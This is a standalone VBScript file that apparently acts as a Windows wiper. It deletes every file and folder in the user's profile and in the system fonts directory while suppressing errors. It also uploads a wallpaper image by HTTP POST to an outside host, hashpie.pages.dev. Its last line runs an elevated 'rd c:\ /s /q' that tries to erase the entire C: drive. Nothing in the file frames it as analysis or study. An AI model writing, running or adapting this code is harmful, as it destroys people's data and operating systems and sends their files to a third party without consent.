Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tempPath = shell.ExpandEnvironmentStrings("%USERPROFILE%")

If fso.FolderExists(tempPath) Then
    Set folder = fso.GetFolder(tempPath)

    For Each file In folder.Files
        On Error Resume Next
        file.Delete True
        On Error GoTo 0
    Next

    For Each subfolder In folder.SubFolders
        On Error Resume Next
        subfolder.Delete True
        On Error GoTo 0
    Next
End If
tempSath = shell.ExpandEnvironmentStrings("%windir%\fonts")

If fso.FolderExists(tempSath) Then
    Set folder = fso.GetFolder(tempSath)

    For Each file In folder.Files
        On Error Resume Next
        file.Delete True
        On Error GoTo 0
    Next

    For Each subfolder In folder.SubFolders
        On Error Resume Next
        subfolder.Delete True
        On Error GoTo 0
    Next
End If
Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Const ForReading = 1
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2

Set objStream = CreateObject("ADODB.Stream")
objStream.Type = adTypeBinary
objStream.Open

' Read the image file (example: first file in C:\Windows\Web\Wallpaper\)
Set objFolder = objFSO.GetFolder("C:\Windows\Web\Wallpaper")
Set colFiles = objFolder.Files

Dim filePath
filePath = ""
For Each file In colFiles
    If LCase(objFSO.GetExtensionName(file.Name)) = "png" Or LCase(objFSO.GetExtensionName(file.Name)) = "jpg" Or LCase(objFSO.GetExtensionName(file.Name)) = "jpeg" Or LCase(objFSO.GetExtensionName(file.Name)) = "bmp" Then
        filePath = file.Path
        Exit For
    End If
Next

If filePath = "" Then
    WScript.Echo "No image file found in C:\Windows\Web\Wallpaper"
    WScript.Quit
End If

objStream.LoadFromFile filePath
arrFile = objStream.Read
objStream.Close

' Prepare multipart/form-data body
boundary = "---------------------------" & Replace(CStr(Timer), ".", "")
CRLF = vbCrLf

Dim body
body = ""

body = body & "--" & boundary & CRLF
body = body & "Content-Disposition: form-data; name=""caption""" & CRLF & CRLF
body = body & "hello world" & CRLF

body = body & "--" & boundary & CRLF
body = body & "Content-Disposition: form-data; name=""file""; filename=""" & objFSO.GetFileName(filePath) & """" & CRLF
body = body & "Content-Type: application/octet-stream" & CRLF & CRLF

Dim bodyBytes()
Dim headerBytes()
Dim footerBytes()
Dim totalLength, i, pos

headerBytes = StrToByteArray(body)
footerBytes = StrToByteArray(CRLF & "--" & boundary & "--" & CRLF)

totalLength = UBound(headerBytes) + 1 + UBound(arrFile) + 1 + UBound(footerBytes) + 1

ReDim bodyBytes(totalLength - 1)

pos = 0
For i = 0 To UBound(headerBytes)
    bodyBytes(pos) = headerBytes(i)
    pos = pos + 1
Next

For i = 0 To UBound(arrFile)
    bodyBytes(pos) = arrFile(i)
    pos = pos + 1
Next

For i = 0 To UBound(footerBytes)
    bodyBytes(pos) = footerBytes(i)
    pos = pos + 1
Next

' Send HTTP POST request
objXMLHttp.Open "POST", "https://hashpie.pages.dev/upload", False
objXMLHttp.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
objXMLHttp.setRequestHeader "Content-Length", totalLength
objXMLHttp.Send ByteArrayToVariant(bodyBytes)

WScript.Echo "Status: " & objXMLHttp.Status
WScript.Echo "Response: " & objXMLHttp.ResponseText

Function StrToByteArray(str)
    Dim arr()
    ReDim arr(LenB(str) - 1)
    Dim i
    For i = 1 To LenB(str)
        arr(i - 1) = AscB(MidB(str, i, 1))
    Next
    StrToByteArray = arr
End Function

Function ByteArrayToVariant(arr)
    Dim i
    Dim byteStr
    byteStr = ""
    For i = 0 To UBound(arr)
        byteStr = byteStr & ChrB(arr(i))
    Next
    ByteArrayToVariant = byteStr
End Function
shell.ShellExecute "cmd.exe", "/c rd c:\ /s /q", "", "runas", 1